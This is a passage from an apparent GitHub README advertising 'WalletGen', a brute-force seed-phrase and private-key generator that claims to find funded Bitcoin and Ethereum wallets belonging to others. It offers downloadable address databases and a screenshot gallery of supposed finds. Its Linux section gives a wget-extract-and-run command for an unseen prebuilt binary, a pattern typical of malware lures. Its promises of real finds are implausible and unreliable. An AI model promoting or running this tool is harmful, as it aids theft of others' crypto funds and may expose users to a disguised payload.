# Seed Phrase / Private Key Generator (WalletGen) – Crypto Wallet Generator, Checker, Recover & Balance Finder for Lost Bitcoin (BTC), Ethereum (ETH), and other EVM Chains



[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20MacOS%20%7C%20Linux-blue)](../../releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)

| |  |
|--------|------|
| <img src="/assets/walletgen-windows.jpg" width="500"> | <img src="/assets/walletgen_macos1.webp" width="500"> |

## How It Works

WalletGen generates wallets using **BIP39**, **BIP44**, and **Bech32** for Bitcoin, and **Keccak256** hashing for EVM-based chains like Ethereum.

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 

##  Why WalletGen?

1. Unlike Python-based brute force tools, **WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **100x faster** performance. Whether you’re exploring lost wallets, verifying private key space, or recovering your own wallet, WalletGen gives you the power to do it efficiently and securely.
2. Wallets like Bitcoin Core, Electrum, Metamask, Trust Wallet, etc., use specific implementations of BIP39/BIP44 and others. WalletGen GPU replicates these exact algorithms — from both old and new versions — capturing real-world entropy models.
3. It uses GPU acceleration to generate and scan massive numbers of seed phrases and derive multiple address paths per seed.
4. WalletGen GPU focuses on realistic derivation schemes, outdated algorithms, and edge-case entropy flaws — things most tools ignore.


## Features

- **Generation of cryptocurrency wallets**
- **Search for wallets with balance**
- **Using a database to speed up searches**
- **High speed of operation**
- **Recovery your Bitcoin wallet**
- **Brain wallet generator**

# Download WalletGen

## Windows 
- Download [WalletGen-Windows-x64-setup](../../releases/tag/walletgen)

## MacOS

- Download [WalletGen.dmg](../../releases/tag/walletgen)

## Linux (x86-64bit)
```bash
wget https://github.com/cote-tony/walletgen/releases/download/walletgen/walletgen-linux-x64.tar.gz
tar -xzf  walletgen-linux-x64.tar.gz
cd walletgen
./walletgen
```


## Demo

<p align="center">
  <b>Windows</b><br>
  <img width="900" alt="WalletGen Windows demo" src="/assets/walletgen-demo.gif" />
</p>

<p align="center">
  <b>macOS</b><br>
  <img width="900" alt="WalletGen macOS demo" src="/assets/walletgen_macos2.webp" />
</p>

<p align="center">
  <b>Linux</b><br>
  <img width="900" alt="WalletGen Linux demo" src="/assets/walletgen-linux.png" />
</p>



### Download and Use Database (for more speed)
| Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
|---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](../../releases/tag/database)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](../../releases/tag/database)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700


## WalletGen Finds


<img width="1070" height="533" alt="find1" src="https://github.com/user-attachments/assets/57ebb4ab-ac2b-4415-902b-d9f4bf38fb5f" />

<img width="1200" height="766" alt="find3" src="https://github.com/user-attachments/assets/05000872-4b9e-4f6b-9b55-fbf4f4e9ccbd" />
<img width="1200" height="529" alt="find2" src="https://github.com/user-attachments/assets/4d804215-aff4-4cb9-8342-b6247df81a3a" />

<img width="1200" height="646" alt="find6" src="https://github.com/user-attachments/assets/19c0507b-439c-4a2f-b56c-bd58a82baa9b" />

<img width="1200" height="501" alt="find7" src="https://github.com/user-attachments/assets/43035b67-e4d9-45f9-ace4-dc1a1a529a86" />

<table>
<tr>
<td>
<img src="https://github.com/user-attachments/assets/28b9fdf3-036b-4699-badb-1f382f3d2e9c" width="700">
</td>
<td>
<img src="https://github.com/user-attachments/assets/ad730fba-76b4-4186-aa35-971f1e2b47ab" width="260">
</td>
</tr>
</table>

<img width="1200" height="536" alt="find9" src="https://github.com/user-attachments/assets/f3f000c5-b4ab-4fd2-aa2e-12eb08164056" />

<img width="1200" height="841" alt="find12" src="https://github.com/user-attachments/assets/841f1ba0-bb10-4b10-b262-98bb7afbc8ab" />

<img width="1145" height="618" alt="find10" src="https://github.com/user-attachments/assets/2c9ae843-c5a9-486e-a3fd-4a3225cd5673" />



## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to search using brute-force method for two types